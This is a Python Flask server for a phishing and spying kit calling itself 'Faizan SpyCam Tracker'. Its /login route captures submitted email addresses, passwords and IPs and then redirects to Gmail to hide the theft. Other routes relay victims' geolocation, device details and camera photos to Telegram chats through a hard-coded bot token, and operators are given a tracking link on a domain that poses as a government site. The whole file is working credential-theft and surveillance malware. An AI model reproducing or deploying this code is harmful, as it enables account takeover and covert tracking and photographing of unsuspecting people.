from flask import Flask, request, render_template, redirect
import os
import requests
import json

app = Flask(__name__)

BOT_TOKEN = '7590817261:AAGL6vH2hi4NPd9x1Iikaqlk40p5xxQ0cBc'  # Replace with your actual bot token
DEFAULT_CHAT_ID = '6908281054'  # Replace with your fallback chat ID (if needed)
REGISTERED_USERS_FILE = 'users.json'

def load_users():
    if os.path.exists(REGISTERED_USERS_FILE):
        with open(REGISTERED_USERS_FILE, 'r') as file:
            return json.load(file)
    return []

def save_user(user_id):
    users = load_users()
    if user_id not in users:
        users.append(user_id)
        with open(REGISTERED_USERS_FILE, 'w') as file:
            json.dump(users, file)

def broadcast_message(message):
    users = load_users()
    for user_id in users:
        send_telegram_message(user_id, message)

def send_telegram_message(chat_id, message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': chat_id, 'text': message}
    try:
        requests.post(url, data=payload)
    except:
        pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    message = f"""
🔐 New Credentials:
📧 Email: {email}
🔑 Password: {password}
📌 IP: {ip}
"""
    broadcast_message(message)
    return redirect('https://gmail.com')

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    if data:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        camera = data.get('camera')
        user_agent = data.get('userAgent')
        device = data.get('deviceInfo')
        city = data.get('city')
        country = data.get('country')
        timezone = data.get('timezone')
        maps_link = data.get('mapsLink')

        location_info = f"📍 Location: {latitude}, {longitude}" if latitude and longitude else "❌ Location Denied"
        info = f"""
🕵️‍♂️ SpyBot Alert
📌 IP Address: {ip}
{location_info}
🌆 City: {city}, 🌍 Country: {country}
🕐 Timezone: {timezone}
🗺️ Map: {maps_link}
📷 Camera: {camera}
🧠 Device: {device}
🌐 UserAgent: {user_agent}
"""
        broadcast_message(info)
    return 'ok'

@app.route('/photo', methods=['POST'])
def photo():
    if 'photo' in request.files:
        photo = request.files['photo']
        files = {'photo': (photo.filename, photo.stream, photo.mimetype)}
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        users = load_users()
        for chat_id in users:
            data = {'chat_id': chat_id}
            try:
                requests.post(url, data=data, files=files)
            except:
                pass
    return 'photo received'

@app.route('/start', methods=['POST'])
def register():
    data = request.get_json()
    user_id = data.get('chat_id')
    if user_id:
        save_user(user_id)
        welcome = """
🔓 *Tracker Activated!*
Welcome to the Faizan™ SpyCam Tracker v3.0.

Click here to start tracking:
👉 https://govt-pak-cyber.onrender.com
"""
        send_telegram_message(user_id, welcome)
    return 'ok'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
